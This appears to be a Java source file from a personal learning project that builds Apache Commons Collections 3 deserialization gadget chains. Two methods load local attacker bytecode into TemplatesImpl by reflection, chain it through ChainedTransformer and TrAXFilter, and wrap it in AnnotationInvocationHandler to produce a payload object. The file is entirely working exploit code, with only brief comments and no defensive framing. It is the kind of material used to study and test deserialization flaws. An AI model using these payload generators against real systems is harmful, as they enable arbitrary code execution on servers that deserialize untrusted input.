package com.yyjccc.CommonsExp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.yyjccc.Utils.Tool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;


import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Cc3 {
    public static Object cc3_1() throws Exception {

        TemplatesImpl templates= new TemplatesImpl();

        Class tc=templates.getClass();
        Field namefield = tc.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"aaa");
        Field bytecodefield = tc.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        //赋给我们的字节码,二维数组，代码会循环遍历
        byte[] code= Files.readAllBytes(Paths.get("D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"));;
        byte [][]  codes={code};
        bytecodefield.set(templates,codes);

        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        //在readObject中赋值了new TransformerFactoryImpl()
        tfactoryfield.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","hu");
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorateMap);
        return o;
    }

    public static Object cc3_2() throws Exception {
        TemplatesImpl templates= new TemplatesImpl();

        Class tc=templates.getClass();
        Field namefield = tc.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"aaa");
        Field bytecodefield = tc.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        //赋给我们的字节码,二维数组，代码会循环遍历
        byte[] code= Files.readAllBytes(Paths.get("D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"));;
        byte [][]  codes={code};
        bytecodefield.set(templates,codes);

        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        //在readObject中赋值了new TransformerFactoryImpl()
        tfactoryfield.set(templates,new TransformerFactoryImpl());

        //        templates.newTransformer();
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        // instantiateTransformer.transform(TrAXFilter.class);


        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        //
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","hu");
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);

        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, decorateMap);
       return o;
    }
}
